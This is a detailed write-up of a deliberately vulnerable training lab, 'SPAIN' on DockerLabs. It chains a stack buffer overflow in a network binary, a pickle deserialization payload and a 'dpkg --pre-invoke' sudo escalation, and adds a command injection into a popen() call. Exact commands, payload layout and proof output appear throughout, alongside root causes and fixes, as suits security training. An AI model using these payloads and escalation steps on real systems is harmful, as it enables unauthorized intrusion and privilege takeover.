# SPAIN — DockerLabs lab (id 148, "Difícil")

> Lab description from the catalogue: *"Laboratorio para practicar la explotación de un
> Buffer Overflow para el acceso inicial, deserialización insegura con pickle"*.
>
> **The description turned out to be accurate**, which makes it the first lab in this
> pilot where the name/description matched the stack. Both advertised classes were
> really present, and both were used in the chain. It is still worth stating why that
> is a result and not a prior: §"What the description got wrong" below records the
> three concrete mismatches that a `-p-` scan and a source read settled.

**Outcome: solved — 3-hop chain to a fourth identity, `darksblack`. No reward artifact
exists in the image.** See §9 for the evidence of absence.

---

## 1. Surface

Deployment: `docker load` of an OCI-layout tar (`blobs/sha256/…` + `manifest.json`),
run as `/usr/local/script/run.sh`.

### 1.1 Recon (literal)

```
$ nmap -sV -Pn -p- 172.17.0.7

PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
80/tcp   open  http        Apache httpd 2.4.62
9000/tcp open  cslistener?
```

Three ports. **9000 is in neither the name nor the description**, and it is the whole
first stage. `nmap` guessed `cslistener?` because nothing in its DB matches a raw
`accept()` loop — the service is not a known protocol, which is itself the signal to
read the strings.

Port 9000 belongs to `/var/www/html/.archivos-secretos/bitlock`:

```
$ strings -a bitlock | grep -i esper
Esperando conexiones en el puerto 9000...
```

### 1.2 Identities and services

`/etc/passwd` (relevant lines):

```
root:x:0:0:root:/root:/bin/bash
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
maci:x:1001:1001:,,,:/home/maci:/bin/bash
darksblack:x:1002:1002::/home/darksblack:/bin/rbash
```

`/etc/sudoers` — the entire attack surface in two lines:

```
www-data ALL=(maci) NOPASSWD: /bin/python3 /home/maci/.time_seri/time.py
maci ALL=(darksblack) NOPASSWD: /usr/bin/dpkg
```

`/usr/local/script/run.sh`:

```bash
service apache2 start
service ssh start
sudo -u www-data /var/www/script.sh &
```

`/var/www/script.sh` supervises the target binary in a 2-second loop, restarting it if
it dies — which is why the overflow is repeatable and why a crash never reads as a
permanent loss of the service:

```bash
ruta="/var/www/html/.archivos-secretos/bitlock"
$ruta &
while true; do
      if [[ $(ps aux |grep -v grep |grep bitlock |awk '{ print $11 }') == "$ruta" ]]; then
             echo 'se esta ejecutando el binario' >> /tmp/logs.log
      else
             echo 'se a detenido el programa!, volviendo a ejecutar' >> /tmp/logs.log
             $ruta &
      fi
      sleep 2
done
```

### 1.3 Web application

Virtual host required — Apache 301s to a hostname otherwise:

```
$ curl -i http://172.17.0.7/manager.php
HTTP/1.1 301 Moved Permanently
Location: http://spainmerides.dlmanager.php
```

```
$ curl -H 'Host: spainmerides.dl' http://172.17.0.7/manager.php
    <td>bitlock</td>
    <td><a href=".archivos-secretos/bitlock" download>Descargar</a></td>
```

Three PHP files. `index.php` and `efemerides.php` are static Spanish-history pages with
no input. `manager.php` is the only dynamic page, and it has no authentication of any
kind.

### 1.4 Binaries

All three are 32-bit i386, dynamically linked, **not stripped**, and all three share an
identical mitigation profile:

| Binary | Owner | Type | PIE | NX | Canary | RELRO |
|---|---|---|---|---|---|---|
| `bitlock` | `www-data` | ELF32 i386 EXEC | **no** | **disabled** | **no** | partial |
| `Olympus` | `darksblack` | ELF32 i386 EXEC | no | disabled | no | partial |
| `OlympusValidator` | `darksblack` | ELF32 i386 EXEC | no | disabled | no | partial |

Literal evidence — `readelf -hW` type and `GNU_STACK` flags:

```
===== bitlock =====
  Type:                              EXEC (Executable file)
  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RWE 0x10
```

`RWE` on `GNU_STACK` is NX disabled. `EXEC` is PIE disabled. No `__stack_chk_fail`
import in any of the three, so no stack canary. This is a deliberately weaponised
training target, not a misconfiguration.

---

## 2. What the description got wrong

Recording this because the pilot's standing lesson is that the name is a label, and
because three of these are non-obvious enough to have cost time.

1. **Port 9000 is undisclosed.** The description implies the buffer overflow is reached
   through the web application. It is not: it is a raw TCP service, and the only hint
   that it exists is a full port scan.
2. **The binary is handed to you, unauthenticated.** `manager.php` links
   `.archivos-secretos/bitlock` with a `download` attribute and Apache serves it. The
   exploit target is a published artefact — you never need to guess its location, and
   you never need to fuzz. Verified byte-identical to the copy extracted from the image:

   ```
   $ curl -H 'Host: spainmerides.dl' -o dl http://172.17.0.7/.archivos-secretos/bitlock
   $ md5sum dl
   d3062602c6b98aa445da7b6122d27c47  dl
   ```
   (matches the image's own `md5sum /var/www/html/.archivos-secretos/bitlock`.)
3. **"Insecure deserialization with pickle" is gated off by default, and the gate is
   world-writable.** `time.conf` ships `serial=off`, so the advertised pickle primitive
   does nothing out of the box. The description does not mention the gate, and the gate
   is the interesting part.

---

## 3. Findings

### F-01 — Unauthenticated stack-based buffer overflow, RCE as `www-data` (CWE-787, CWE-121)

**Where.** `/var/www/html/.archivos-secretos/bitlock`, `tcp/9000`.

**Evidence — the sink, from the disassembly.** `main` reads up to 1024 bytes and passes
the buffer to a handler that `strcpy`s it into an 18-byte stack buffer:

```
08049267 <hald>:
 8049268:	mov    ebp,esp
 804927b:	push   DWORD PTR [ebp+0x8]     ; src = attacker-controlled buffer
 804927e:	lea    edx,[ebp-0x12]          ; dst = 18-byte stack buffer
 8049281:	push   edx
 8049284:	call   80490a0 <strcpy@plt>    ; <-- unbounded copy
 8049290:	leave
 8049291:	ret
```

```
 8049422:	push   0x400                    ; count = 1024
 8049427:	lea    eax,[ebp-0x43c]          ; src = 1024-byte read buffer
 8049431:	call   8049050 <read@plt>
 804946c:	call   8049267 <hald>
```

**Offset to EIP: 22.** 18 bytes of buffer (`ebp-0x12`..`ebp-0x1`), 4 bytes of saved EBP,
then the return address.

**Exploit.** NX is disabled, so shellcode runs from the stack. `jmp esp` is present and —
usefully — *named in the symbol table* as the last two bytes of `.text`:

```
 804948a:	ret

0804948b <jmp_esp>:
 804948b:	jmp    esp
```

Payload: 22 bytes padding + `0x0804948b` + 2 alignment bytes + 67-byte shellcode
(`dup2(4,0/1/2)` then `execve("/bin/sh", NULL, NULL)`) + a trailing NUL — **96 bytes
total**.

**Impact — the identity is the finding.** Per `decision-making.md` §8, `id` was the first
command inside the new primitive:

```
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ whoami
www-data
$ hostname
1f05d752cd19
$ uname -a
Linux 1f05d752cd19 7.0.0-34-generic #34-Ubuntu SMP PREEMPT_DYNAMIC Wed Sep  2 14:29:37 UTC 2026 x86_64 GNU/Linux
```

**Not root.** The advertised "access inicial" is a `www-data` shell, so every other
injection in this web root is one request from a full application compromise, and the
chain continues through `sudo`, not through privilege escalation.

**Root cause.** `strcpy` of network input into a fixed 18-byte stack buffer in a binary
compiled with every mitigation off. The fix is not "be careful with strcpy": it is
`-fstack-protector-strong`, `-D_FORTIFY_SOURCE=2`, PIE, and NX, none of which are
present. Reachability is the bug — the service is bound to `0.0.0.0` with no
authentication and no `SO_REUSEADDR`-style gate, so any host that can route to 9000
owns the process.

### F-02 — Unauthenticated file manager discloses the exploit target (CWE-306, CWE-548)

**Evidence.**

```
$ curl -H 'Host: spainmerides.dl' -D - -o /tmp/dl \
      http://172.17.0.7/.archivos-secretos/bitlock
HTTP/1.1 200 OK
Server: Apache/2.4.62 (Debian)
Last-Modified: Mon, 23 Dec 2024 10:19:11 GMT
ETag: "3be0-629ed53d945c0"
Content-Length: 15328
```

`manager.php` performs `scandir()` on `.archivos-secretos` and emits a download link per
entry, with no `session_start()`, no `$_SESSION` check, and no `require` of any auth
module. It renders filenames through `htmlspecialchars()` — the output encoding is
correct, and the authorisation is entirely absent, which is the more useful distinction:
this is not an XSS, it is a missing gate.

**Impact.** Independent of the chain: it publishes the exact binary, at the exact path,
with a stable `ETag`, to any anonymous client. That converts "find the vulnerable
service" into one GET. On a real target this is also a full directory listing of a
dot-directory, which the author clearly intended to be hidden — `.archivos-secretos` is
served at all only because Apache's default does not exclude dotfiles from an explicit
URL.

**Root cause.** A file-browsing route shipped with no authorisation, and a web server
with no `<Location>` deny for the hidden directory. Remediation: put the route behind the
same auth as the rest of the admin surface, and `<LocationMatch>`-deny dot-directories.

### F-03 — World-writable pickle file + world-writable gate config → RCE as `maci` (CWE-732, CWE-502)

**The interpreter.** `/home/maci/.time_seri/time.py` (world-writable, mode 666):

```python
import pickle
import os
file_path = "/opt/data.pk1"
config_file_path = "/home/maci/.time_seri/time.conf"
...
        with open(file_path, 'rb') as f:
            data = pickle.load(f)
...
def is_serial_enabled(config_file_path):
    ...
        if line.startswith('serial='):
            value = line.split('=')[1].strip()
            return value.lower() == 'on'
```

`pickle.load()` on a file any local user can write, with no allowlist, no
`find_class` override, and no signature.

**Permissions (the actual mechanism):**

```
-rw-rw-rw- 1 root  root   143  /opt/data.pk1
-rw-r--rw- 1 maci  maci    11  /home/maci/.time_seri/time.conf
```

**The gadget chain.** `pickle` is a bytecode interpreter, not a data format. To rebuild
an object the unpickler evaluates `GLOBAL` opcodes through
`pickle.Unpickler.find_class(module, name)`, which does `__import__(module)` and then
`getattr`. So the question is never "how malicious is the payload" — it is **which
callables are reachable by name in this interpreter**.

Gadget used: `(os.system, ("<cmd>",))` via `__reduce__`. The 69-byte payload decodes to:

```
cosix
system
p0
(Vid > /tmp/spain_pickle_proof.txt 2>&1
p1
tp2
Rp3
.
```

`os` is already in `sys.modules` because `time.py` itself does `import os`, and
`find_class` would import it regardless — so **no third-party package and no interpreter
flag is required; a bare CPython suffices.** `os.system` is the cheapest reachable
gadget, which is exactly why it is the first one to try, and its output is discarded by
`time.py` (the `print(data)` is commented out), so a file or socket side effect is the
only observable.

**Why it is reachable: the gate is voided by its own permissions.** `serial=off` ships as
the default and genuinely blocks the primitive — proven differentially in §5. But the
file carrying the setting is mode `666`, so `www-data` flips it:

```
$ echo 'serial=on' > /home/maci/.time_seri/time.conf
$ echo '<base64 pickle>' | base64 -d > /opt/data.pk1
$ sudo -n -u maci /bin/python3 /home/maci/.time_seri/time.py
Datos deserializados correctamente, puedes revisar /tmp
$ cat /tmp/spain_pickle_proof.txt
uid=1001(maci) gid=1001(maci) groups=1001(maci),100(users)
```

**Impact.** Code execution as `maci`. Note the extra group: `maci` is in group `100
(users)`, which is what makes it useful as a sudo principal rather than a dead end.

**Root cause.** Three independent defects that each alone would have blocked the chain:
(a) `pickle.load` on attacker-writable input with no class allowlist — the security
control for `pickle` is `find_class` overriding or a signed format, and neither exists;
(b) the pickle file is mode `666`; (c) the *configuration* that gates the deserialiser is
mode `666`. Fix (a) primarily; (b) and (c) are `0644 root:root`.

### F-04 — `sudo` rule on a program that executes its own arguments: RCE as `darksblack` (CWE-269)

**The rule:** `maci ALL=(darksblack) NOPASSWD: /usr/bin/dpkg`.

`sudo` pins the *program* and its version of an interpreter — here `/usr/bin/dpkg`. The
mistake is that `dpkg` is not a leaf: it accepts `--pre-invoke=<command>` and dispatches
it to a shell **before** it performs its own privilege check.

```
$ dpkg --help | grep -iE 'pre-invoke|post-invoke'
  --pre-invoke=<command>     Set a pre-invoke hook.
  --post-invoke=<command>    Set a post-invoke hook.
```

So an operation that needs no privileges at all still runs the hook as the target user,
and *then* fails:

```
$ sudo -n -u darksblack /usr/bin/dpkg \
      --pre-invoke='id > /tmp/dbg_hook.txt 2>&1' --unpack /tmp/spainprobe.deb
dpkg: error: requested operation requires superuser privilege
$ cat /tmp/dbg_hook.txt
uid=1002(darksblack) gid=1002(darksblack) groups=1002(darksblack)
```

**Two constraints that cost cycles and are worth writing down:**

- `dpkg` splits `--pre-invoke` on `;`. A `{ a; b; }` group is shredded into separate
  hooks and the run "succeeds" while producing no output — which is indistinguishable
  from a chain that stopped short. The hook value must be a single simple command;
  put logic in a script and pass its path.
- `/tmp` is sticky and a file `maci` created is mode `0644`, so `darksblack` **cannot
  overwrite it**. Reusing one output path silently returned `maci`'s earlier output.
  This one is nasty: the stale file is a *plausible* answer, not an error, so the
  reported identity was one step behind the real one until a unique path was used.

**Impact.** Code execution as `darksblack`, and with it the only content in
`/home/darksblack` (mode `750`, unreadable by `www-data` and `maci`).

**Root cause.** The sudo rule names a program that is itself a command interpreter over
its own argument vector. `sudo` cannot express "this program, but not its
`--pre-invoke`". The remediation is to drop the rule; where a package tool is genuinely
required, wrap it in a root-owned script that passes a fixed argument list.

### F-05 — OS command injection in `Olympus` via `popen()` (CWE-78)

**Not used by the chain** — it grants nothing beyond `darksblack`, which F-04 already
reaches. Reported because it is real and independently exploitable by any account that
can execute the binary.

`main` in `/home/darksblack/Olympus`:

```
 804923f:	lea    eax,[ebp-0x74]           ; serial buffer
 804924a:	call   __isoc99_scanf@plt        ; scanf("%s", serial) -- ONE token
 8049262:	lea    eax,[ebp-0x178]          ; command buffer
 804925d:	push   0x96                      ; size
 8049269:	call   snprintf@plt              ; ".../OlympusValidator %s", serial
 8049282:	call   popen@plt                 ; popen() -> /bin/sh -c
```

The serial is interpolated into a command string that `popen()` hands to `/bin/sh -c`.
Because `scanf("%s")` reads a **single whitespace-delimited token**, `; id` is truncated
to `;` and does nothing — the payload has to be one space-free token, which `$( )` and
backticks both are:

```
$ printf '2\n$(id>/tmp/spain_inject.txt)\n' | ./Olympus
Selecciona el modo:
1. Invitado
2. Administrador
Introduce el serial: Serial invalido, vuelve a intentar
$ cat /tmp/spain_inject.txt
uid=1002(darksblack) gid=1002(darksblack) groups=1002(darksblack)

$ printf '2\n`whoami>/tmp/spain_inject2.txt`\n' | ./Olympus >/dev/null 2>&1
$ cat /tmp/spain_inject2.txt
darksblack
```

**Root cause.** Untrusted input into a shell command line. Fix: `execve` the validator
directly, or pass the serial as an `argv` element and never build a command string.

### F-06 — The serial gate protects nothing (CWE-285 / CWE-863)

**A control that does not hold, which is a finding.**

`Olympus` gates its "administrator" mode behind a serial validated by
`OlympusValidator`. The guest mode prints the identical task list with no credential at
all:

```
$ printf '1\n' | ./Olympus
Selecciona el modo:
1. Invitado
2. Administrador
Bienvenido al modo invitado, aqui podras obtener la lista de tareas pendientes.
1. Desarrollo website empresa: Tradeway Consulting CORP
2. Prueba de Penetracion empresa: Tradeway Consulting CORP
3. Securizar red corporativa en Tradeway Consulting CORP
```

The serial is decorative. The content is flavour text, so nothing is actually disclosed —
but the gate's *purpose* (distinguish guest from admin) is not met by the code, and a
reviewer reading the menu would reasonably conclude otherwise.

### F-07 — The obfuscated serial is derivable from the shipped binary (CWE-200 / CWE-330)

`OlympusValidator` contains the expected serial in obfuscated form and a `spoof`
de-obfuscation routine; the same obfuscated literal appears in both binaries:

```
$ strings -a /home/darksblack/.zprofile/OlympusValidator | grep -A1 'Y\[\^'
Y[^]
jZjMjFjDj-j1jPjQjQj-j0jPjLjOj-j3jSjHjGj-j8j7j6jA
```

A client-side secret embedded in a distributed binary is not a secret. I did **not**
spend time decoding it, because F-06 shows the gate protects nothing — the finding is the
embedding, not the recovered value.

### F-08 — `darksblack` is a terminal identity, and that is a finding

`darksblack` has no further privilege path, verified rather than assumed:

```
$ sudo -n -l
sudo: a password is required
```

No sudo rules, and no SUID binary beyond the distribution defaults
(`passwd`, `su`, `mount`, `sudo`, `ssh-keysign`, `unix_chkpwd`). `/root` is unreadable
(`drwx------`). So the chain is 3 hops and stops. **A chain that took exactly the number
of hops the design implies, with every boundary intact, is evidence the controls held**
(`decision-making.md` §8).

### F-09 — Anti-forensics: `.bash_history` symlinked to `/dev/null`

```
lrwxrwxrwx 1 root root 9 Dec 26  2024 .bash_history -> /dev/null
```

Root-owned, and it works: darksblack's history is genuinely suppressed. This is the
control that held most cleanly in the lab, and it is worth reporting as a positive —
while noting it is trivially bypassed by an attacker who plants their own history file
before the first login, since `darksblack`'s home is writable by `darksblack`.

---

## 4. The chain

| # | From → To | Mechanism | Identity proof |
|---|---|---|---|
| 1 | anonymous → `www-data` | BOF in `bitlock` on `tcp/9000` (F-01) | `uid=33(www-data)` |
| 2 | `www-data` → `maci` | `sudo -u maci python3 time.py` + pickle gadget (F-03) | `uid=1001(maci) gid=1001(maci) groups=1001(maci),100(users)` |
| 3 | `maci` → `darksblack` | `sudo -u darksblack dpkg --pre-invoke=<cmd>` (F-04) | `uid=1002(darksblack) gid=1002(darksblack) groups=1002(darksblack)` |

**Why each hop is where it is, and not earlier or later:**

- **Hop 1 is `tcp/9000`, not the web tier.** The web tier gives nothing: `index.php` and
  `efemerides.php` take no input, and `manager.php` (F-02) discloses the target rather
  than executing anything. The buffer overflow is reachable only through the undisclosed
  port, and it lands on `www-data` — not root — so it is a foothold, not the answer.
- **Hop 2 is the pickle, and only after the gate is flipped.** Reaching `maci` looks
  available the moment you have `www-data`, because the sudo rule is right there in
  `/etc/sudoers`. But running `time.py` with the shipped config prints
  `La serialización está deshabilitada` and does nothing. The hop costs *two* writes, not
  one: flip the `666` config, then plant the `666` pickle. Reading the permissions rather
  than assuming them is what turned a dead end into a hop.
- **Hop 3 is `dpkg`, and the obvious use of it fails.** `dpkg -i` refuses:
  `requested operation requires superuser privilege`. A `preinst` maintainer script in a
  crafted `.deb` — the standard "sudo dpkg" trick — therefore does not fire. The
  argument-injection route (`--pre-invoke`) does, because the hook is dispatched *before*
  the privilege check. So the escalation is not in dpkg's install path at all; it is in
  dpkg's argument parser.
- **The chain stops at `darksblack` because the deployment stops there** (F-08), not
  because the tester stopped looking.

### Unused findings (reported, not used in the chain)

F-02 (unauthenticated binary disclosure), F-05 (`popen` command injection), F-06
(decorative serial gate), F-07 (embedded serial), F-09 (history suppression, a control
that held).

---

## 5. Control tests

Two controls in this lab are worth reporting with the same prominence as the bugs,
because one held and one did not, and they are only distinguishable by a test.

### C-01 — The `serial=off` gate **works** (differential proof)

Same malicious pickle, only the gate differs:

```
##### A: serial=off (shipped default) + malicious pickle #####
    La serialización está deshabilitada. El programa no se ejecutará.
    executed? NO

##### B: serial=on + same malicious pickle #####
    Datos deserializados correctamente, puedes revisar /tmp
    executed? YES
    CONTROL_PROOF
```

This is the point worth carrying forward: **the control functioned correctly and is
still void**, because the file that carries the setting is mode `666`. A reviewer who
tested only the gate would conclude the pickle path was closed. Reporting "the control
held" without the differential would have been wrong, and so would reporting "the pickle
was exploitable out of the box" without it.

### C-02 — `/home/darksblack` mode `750` held

`www-data` and `maci` both fail to traverse it, which is what forced hop 3 to go through
`dpkg` rather than straight to `Olympus`:

```
$ ls -la /home/darksblack/
ls: cannot open directory '/home/darksblack/': Permission denied
```

This is the control that makes the `dpkg` rule *necessary* rather than redundant.

### C-03 — `darksblack` has no privilege path (F-08)

Confirmed with `sudo -n -l` (password required) and a full SUID enumeration, not inferred
from the absence of a rule in the file I read.

---

## 6. Self-correction (prominent, because this run had four)

The first three were caught **before** the exploit was declared working; the fourth was
caught only after a successful-looking run. All four share one shape: **the failure was
invisible from the client, and each looked like a dead target.** Per
`decision-making.md`, the check was shaped so that "the interesting answer" and "the
boring answer" produced the same output.

### 6.1 `jmp esp` alignment — off by 2 bytes

`hald` ends `leave; ret`. `leave` is `mov esp,ebp; pop ebp`, so on entry to `jmp esp`,
**esp = ebp+8** — four bytes past the saved return address (which occupies
`ebp+4..ebp+7`), not at it. My first payload placed shellcode immediately after the
return address, so `jmp esp` entered the stream 2 bytes off and desynchronised it.

*Symptom:* empty response, then `BrokenPipeError`.
*Caught by:* a **local self-test against a scratch copy** of the binary on a patched port
(9999), before touching the real service.

### 6.2 `strcpy` truncates at the first NUL

`main` writes `buf[read_count] = 0x30` — the ASCII character `'0'`, **not** a NUL — so it
does not terminate the string, and my shellcode contained NUL bytes inside
`mov ecx,1` (`b9 01 00 00 00`) and `mov ebx,3` (`bb 03 00 00 00`). `strcpy` halted at
the first of them, 21 bytes into the shellcode.

*Caught by:* `gdb`, which showed the exact bytes:

```
0xffed8d40:	0x01b903b3	0x00000000	0x00000000	0x41414141
                                      ^^^^^^^^ my cd 80 replaced by stale stack
```

This is `decision-making.md`'s "validate the value, not the representation" applied to
my own payload: a byte stream that *looked* right in a hex dump was a different program
to the CPU.

### 6.3 `inc ecx` is `0x41`, not `0x40` — and the byte-level test passed anyway

I emitted `0x40` for `inc ecx`. In 32-bit mode the one-byte INC encodings are `0x40+r`, so
`0x40` is `inc eax`. Result: `ecx` stayed 0 and `eax` became `0x40` = 64 = `getppid`.
My NUL-freeness assertion **passed**, and the payload still mis-executed:

```
   16:	41                   	inc    ecx      <- what I meant
    0:	31 c0                	xor    %eax,%eax
   ...
  804948d:  40                   	inc    %eax      <- what I emitted
```

*Caught by:* `gdb` disassembly of the live stack, cross-checked against `strace`, which
showed `getppid()` where a `dup2` should have been. This is the strongest argument in the
run for the methodology's evidence rule: **the tool self-test validated the generator and
still missed a semantic error.** The fix was to make the self-test *decode* the bytes and
assert syscall arguments, rather than trust my intent for an opcode.

### 6.4 Little-endian immediates, and a self-inflicted string

After 6.3, `execve` failed with `ENOENT` on `"nib/n/sh"` — `push 0x2f62696e` stores the
bytes `6e 69 62 2f` = `"nib/"`, because x86 is little-endian. Fixing that produced
`"/binn/sh"`, because the second push already contained the `/` I was adding. Building
`"/bin/sh\0"` from `push` immediates then collides with 6.2: the literal `"/sh\0"`
immediate contains a NUL and `strcpy` truncates on it.

Resolved by pushing `"/sh!"` and overwriting the filler byte through a zeroed register,
all with NUL-free encodings — and, critically, by **emulating the stack in the self-test**:

```python
push32(0x2168732F); push32(0x6E69622F); mem[esp+7] = 0
assert bytes(mem[esp:esp+8]) == b"/bin/sh\x00"
```

That emulation caught the `"/bin//sh"` variant *before* it reached the target, and it now
ships as part of the exploit's `self_test()`.

### 6.5 Two harness defects that produced a *plausible wrong identity*

Both of these nearly caused a misreported finding, and both are the "control that cannot
fail" shape:

- **Stale output file.** `/tmp` is sticky and a file `maci` created is `0644`, so
  `darksblack` could not overwrite it. `cat` returned `maci`'s *earlier* output. The
  reported identity was one step behind the real one, and the output was
  well-formed — a plausible answer, not an error. Fixed by using a unique path per call.
- **Compound hook value.** `dpkg` splits `--pre-invoke` on `;`, so a `{ a; b; }` group
  was shredded and the run produced no output. This reads exactly like "the escalation
  does not work."

Neither would have been caught by re-running; only by making the harness's *identity* and
*freshness* properties explicit.

### 6.6 A lesson about reading a trace

I initially misread the strace line `execve("nib/n/sh", ...)` as a pointer 3 bytes off,
and nearly went looking for a stack-alignment bug. The pointer was exactly `esp`; the
*bytes at* `esp` were wrong. One `struct.pack` check settled it. This is
`decision-making.md`'s "recompute before you accuse" — the accusation here was against my
own exploit, and it was as wrong as the ones the methodology warns about.

---

## 7. No reward artifact exists

There is no `FLAG{}`, no flag file, and no completion text in this image. Reported as an
absence with evidence rather than filled in.

Operator-level search (root, whole container filesystem, excluding `/proc`, `/sys`,
`/dev`):

```
$ grep -rIl -E 'FLAG\{|flag\{|CTF\{|flag:' / 2>/dev/null
/usr/share/doc/shared-mime-info/shared-mime-info-spec.html/x34.html
/usr/share/gdb/python/gdb/command/pretty_printers.py
/usr/share/vim/vim90/doc/spell.txt
/usr/share/perl/5.36.0/diagnostics.pm
... (all distribution documentation)

$ find / -xdev \( -iname 'flag*' -o -iname '*congratulations*' \
      -o -iname '*recompensa*' -o -iname '*.flag' \) 2>/dev/null \
    | grep -viE 'zoneinfo|terminfo|man/|include/|doc/'
/var/www/html/.archivos-secretos
```

Every hit is a false positive from vim/perl/gdb docs. The single name match is the secret
directory itself.

The lab author's own `/root/.bash_history` is deployment verification, not a reward:

```
whoami
id
exit
cd /var/www/
nano script.sh
hostname -I
```

`/home/darksblack/.viminfo` is likewise the author's scratch (`:!bash`, `:/bin/bash`) —
evidence about *intent* while building the serial check, not about reachability, per
`decision-making.md` §7.

**Therefore the success condition for this lab is the chain itself**: unauthenticated
`tcp/9000` → `www-data` → `maci` → `darksblack`, with no authentication at any stage.

---

## 8. What was not tested

- **SSH (22/tcp).** Open, and never used. No credential was found for `maci` or
  `darksblack`; the chain never needed one, so password spraying against it was not
  attempted and is not claimed as covered.
- **Root.** Not reached and not shown to be reachable — see F-08. "Not reachable from
  `darksblack`" is a bounded claim about the paths enumerated, not a proof of
  impossibility.
- **The serial value.** F-07 recovered the obfuscated literal but not the plaintext,
  because F-06 makes the gate irrelevant. Deliberate, not an oversight.
- **Race conditions on the 2-second supervisor loop.** Not probed. Repeated crashes were
  observed to self-heal, which is all that is claimed.
- **32-bit vs 64-bit differential behaviour.** Only 32-bit paths were exercised; the
  container is amd64 with `ia32` compatibility.

---

## 9. Lab design observation

The lab teaches one thing unusually well and one thing not at all.

**Well: the privilege ladder is a sudo graph, not a vertical.** Neither `www-data` nor
`maci` can escalate to root anywhere in this image. Every hop is a `sudo` rule that
*changes principal* (`www-data → maci`, `maci → darksblack`) rather than a privilege
escalation. That is a good model of what lateral movement actually looks like in a
correctly configured estate, and it means the honest answer to "did you get root" is
"there is no root here", which is a more useful lesson than another `chmod 777`.

**Not at all: the web tier is decoration.** `index.php` and `efemerides.php` are static
pages, `manager.php` only discloses, and the advertised buffer overflow is on a raw port
the description never mentions. A learner who reads the description and starts in the
browser will not find the first stage. The description *names* both classes correctly
(unlike the previous five labs), but it points at the wrong component for the first one.

**The unfixed gap a lab author should close:** the pickle stage is advertised as the
second stage, yet it ships disabled (`serial=off`). A learner who follows the
description, lands on `time.py`, sees `La serialización está deshabilitada`, and has no
signal that the interesting part is that the *gate's own config file is world-writable*.
The intended lesson — a control that works and is voided by its permissions — is real and
good, but nothing in the lab points at it, and the advertised stage reads as broken
rather than as a permissions puzzle. Shipping it `serial=on` with the config `0644
root:root` would make the same lesson teachable by accident of omission.

---

## 10. Restoration

The lab was returned to its shipped state and verified byte-identical where it matters.

| Item | Action | Verification |
|---|---|---|
| `/opt/data.pk1` | overwritten with the image's own copy | `md5sum` = `3a633f1b185111700e84bfd80a86db97`, size 143, mode `666 root:root` — **matches pristine** |
| `/home/maci/.time_seri/time.conf` | overwritten with the image's own copy | content `serial=off`, size 11, mode `666 maci:maci` — **matches pristine** |
| `/tmp/*` | all 26 artifacts I created removed | `/tmp` holds only `.data2.log` and `logs.log`, the two files present at container start |
| `gdb`, `strace` | installed by me for diagnosis; purged | `which gdb strace` → not found |
| scratch binaries (`bitlock_9999`, `bitselftest`) | removed, processes killed | `ps aux` shows only the shipped `bitlock` |

Both modified files were restored from copies extracted from the **image itself**, not
from a transcription, so the md5 comparison is against pristine bytes rather than
against my own memory of them.

`/tmp/logs.log` grows continuously by design — the supervisor appends to it every 2
seconds — so it is not byte-identical and is not claimed to be. It is the shipped
supervisor's own log and was never edited by me.

Post-restore functional check, all passing: `index.php` → `200`, `manager.php` → `200`,
`tcp/9000` accepting connections, `time.py` → `La serialización está deshabilitada`.
